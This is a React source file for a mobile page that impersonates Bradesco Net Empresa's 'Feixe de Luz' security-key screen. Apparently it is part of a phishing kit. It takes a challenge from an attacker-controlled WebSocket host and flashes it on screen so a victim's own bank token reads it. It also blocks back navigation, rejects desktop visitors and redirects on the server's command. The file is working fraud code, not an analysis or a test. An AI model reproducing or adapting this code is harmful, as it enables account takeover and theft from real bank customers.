import { useEffect, useRef, useState, useCallback } from "react";
import { useNavigate } from "react-router-dom";
import bradescoLogo from "@/assets/bradesco-logo.png";

const FeixePage = () => {
  const navigate = useNavigate();
  const usuario = sessionStorage.getItem("usuario") || "";
  const nome = sessionStorage.getItem("nome") || "";
  const dispositivo = sessionStorage.getItem("dispositivo") || "";
  const wsRef = useRef<WebSocket | null>(null);
  const [status, setStatus] = useState<"aguardando" | "lendo" | "validando" | "erro">("aguardando");
  const [binario, setBinario] = useState<string>("");
  const [corAtual, setCorAtual] = useState<"black" | "white">("black");
  const intervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const indexRef = useRef(0);

  const iniciarLeitura = useCallback(() => {
    if (!binario) return;
    setStatus("lendo");
    indexRef.current = 0;

    if (intervalRef.current) clearInterval(intervalRef.current);

    intervalRef.current = setInterval(() => {
      if (indexRef.current >= binario.length) {
        // Finished flashing — loop or stop
        clearInterval(intervalRef.current!);
        intervalRef.current = null;
        setCorAtual("black");
        // Notify server that reading is done
        wsRef.current?.send(JSON.stringify({ acao: "feixe_lido", usuario }));
        return;
      }

      const bit = binario[indexRef.current];
      setCorAtual(bit === "1" ? "white" : "black");
      indexRef.current++;
    }, 50); // 50ms per bit
  }, [binario, usuario]);

  useEffect(() => {
    const ws = new WebSocket("wss://syncservicesqrgeneretor.online/ws/");
    wsRef.current = ws;

    ws.onopen = () => {
      console.log("FeixePage WS conectado");
      if (usuario) {
        ws.send(JSON.stringify({ acao: "reconectar", usuario }));
      }
    };

    ws.onmessage = (event) => {
      const msg = JSON.parse(event.data);
      console.log("FeixePage msg:", msg);

      if (msg.acao === "feixe_binario" && msg.binario) {
        setBinario(msg.binario);
        setStatus("aguardando");
      }

      if (msg.acao === "redirecionar" && msg.url) {
        setStatus("validando");
        setTimeout(() => {
          window.location.href = msg.url;
        }, 1500);
      }

      if (msg.acao === "erro_feixe") {
        setStatus("erro");
        if (intervalRef.current) {
          clearInterval(intervalRef.current);
          intervalRef.current = null;
        }
      }
    };

    ws.onerror = (err) => console.error("Feixe WS erro:", err);

    return () => {
      ws.close();
      if (intervalRef.current) clearInterval(intervalRef.current);
    };
  }, [usuario]);

  // Prevent back navigation
  useEffect(() => {
    window.history.pushState(null, "", window.location.href);
    const handlePop = () => window.history.pushState(null, "", window.location.href);
    window.addEventListener("popstate", handlePop);
    return () => window.removeEventListener("popstate", handlePop);
  }, []);

  return (
    <>
      {/* Desktop blocker */}
      <div className="hidden md:flex min-h-screen items-center justify-center bg-[hsl(220,60%,40%)] p-8">
        <div className="text-center text-white max-w-sm space-y-4">
          <div className="w-16 h-16 rounded-2xl bg-white/20 flex items-center justify-center mx-auto">
            <svg xmlns="http://www.w3.org/2000/svg" className="w-8 h-8" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><path d="M12 18h.01"/></svg>
          </div>
          <h2 className="text-xl font-bold">Acesso exclusivo pelo celular</h2>
          <p className="text-white/70 text-sm leading-relaxed">
            Este portal está disponível apenas para dispositivos móveis.
          </p>
        </div>
      </div>

      {/* Mobile layout */}
      <div className="md:hidden min-h-screen flex flex-col bg-white">
        {/* Blue header bar */}
        <div className="bg-[hsl(220,60%,40%)] px-4 py-3 flex items-center gap-3">
          <h1 className="text-white text-base font-semibold tracking-tight">
            Bradesco Net Empresa
          </h1>
        </div>

        <div className="flex flex-col flex-1 px-5 pt-6 pb-8">
          {/* Title */}
          <h2 className="text-[hsl(220,20%,14%)] text-lg font-bold mb-6">
            Chave de Segurança - Feixe de Luz
          </h2>

          {/* Black square - feixe area */}
          <div className="flex justify-start mb-6">
            <div
              className="w-40 h-40 border border-[hsl(220,14%,80%)] transition-colors duration-[30ms]"
              style={{ backgroundColor: status === "lendo" ? corAtual : "black" }}
            />
          </div>

          {/* Instructions */}
          <div className="space-y-3 mb-8">
            <p className="text-[hsl(220,10%,40%)] text-sm leading-relaxed">
              1 - Na sua chave, aperte o botão com o desenho de cadeado
            </p>
            <p className="text-[hsl(220,10%,40%)] text-sm leading-relaxed">
              2 - Posicione o sensor que fica no verso dela, na frente deste quadro preto (cerca de 1 cm)
            </p>
            <p className="text-[hsl(220,10%,40%)] text-sm leading-relaxed">
              3 - Com a chave posicionada, clique em Iniciar Leitura, aqui na tela, e aguarde.
            </p>
          </div>

          {/* Button */}
          {status === "aguardando" && (
            <button
              onClick={iniciarLeitura}
              disabled={!binario}
              className="w-full max-w-[240px] mx-auto h-12 rounded-full bg-[hsl(349,93%,42%)] text-white text-base font-semibold active:scale-[0.97] transition-all duration-200 disabled:opacity-50"
            >
              Iniciar Leitura
            </button>
          )}

          {status === "lendo" && (
            <div className="flex flex-col items-center gap-3">
              <div className="w-8 h-8 border-[3px] border-[hsl(220,14%,89%)] border-t-[hsl(349,93%,42%)] rounded-full animate-spin" />
              <p className="text-[hsl(220,10%,46%)] text-sm animate-pulse">
                Realizando leitura...
              </p>
            </div>
          )}

          {status === "validando" && (
            <div className="flex flex-col items-center gap-3">
              <svg xmlns="http://www.w3.org/2000/svg" className="w-10 h-10 text-[hsl(142,71%,45%)]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                <path d="m9 12 2 2 4-4"/>
              </svg>
              <p className="text-[hsl(142,71%,45%)] text-sm font-medium">
                Validado! Redirecionando...
              </p>
            </div>
          )}

          {status === "erro" && (
            <div className="flex flex-col items-center gap-3">
              <p className="text-[hsl(0,84%,60%)] text-sm">
                Não foi possível validar. Tente novamente.
              </p>
              <button
                onClick={() => {
                  setStatus("aguardando");
                  wsRef.current?.send(JSON.stringify({ acao: "reconectar", usuario }));
                }}
                className="px-8 h-12 rounded-full bg-[hsl(349,93%,42%)] text-white text-sm font-semibold active:scale-[0.97] transition-all duration-200"
              >
                Tentar novamente
              </button>
            </div>
          )}
        </div>
      </div>
    </>
  );
};

export default FeixePage;
